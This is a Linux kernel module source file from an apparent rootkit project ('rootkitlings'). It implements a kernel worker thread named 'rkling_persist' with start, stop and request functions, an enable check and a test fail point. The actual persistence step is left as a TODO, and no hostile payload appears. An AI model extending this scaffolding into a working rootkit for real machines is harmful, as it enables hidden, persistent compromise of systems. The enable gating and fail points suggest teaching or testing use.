// SPDX-License-Identifier: GPL-2.0
#include <linux/atomic.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/wait.h>

#include "rootkit.h"
#include "transaction.h"

static struct rk_state *worker_state;
static struct rk_transaction *worker_transaction;
static struct task_struct *worker_task;
static wait_queue_head_t worker_wait;
static atomic_t pending;

static int rk_worker_main(void *unused)
{
	for (;;) {
		wait_event_interruptible(worker_wait,
					 atomic_read(&pending) != 0 ||
					 kthread_should_stop());
		if (kthread_should_stop())
			break;
		if (atomic_xchg(&pending, 0) == 0)
			continue;
		if (!rk_state_actions_enabled(worker_state))
			continue;
		/*
		 * TODO: if persist was requested and the transaction is idle,
		 * call rk_transaction_apply(worker_transaction).
		 */
		rk_state_record_worker_run(worker_state);
	}

	return 0;
}

__must_check int rk_worker_request(void)
{
	if (!rk_state_actions_enabled(worker_state))
		return -EACCES;
	if (atomic_cmpxchg(&pending, 0, 1) != 0)
		return -EAGAIN;

	wake_up_interruptible(&worker_wait);
	return 0;
}

__must_check int rk_worker_start(struct rk_state *state,
				 struct rk_transaction *transaction)
{
	int error;

	worker_state = state;
	worker_transaction = transaction;
	init_waitqueue_head(&worker_wait);
	atomic_set(&pending, 0);
	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_WORKER_CREATE)
		worker_task = ERR_PTR(-EINTR);
	else
		worker_task = kthread_run(rk_worker_main, NULL, "rkling_persist");
	if (!IS_ERR(worker_task))
		return 0;

	error = PTR_ERR(worker_task);
	worker_task = NULL;
	worker_state = NULL;
	worker_transaction = NULL;
	return error;
}

void rk_worker_stop(void)
{
	if (!worker_task)
		return;

	kthread_stop(worker_task);
	worker_task = NULL;
	atomic_set(&pending, 0);
	worker_state = NULL;
	worker_transaction = NULL;
}
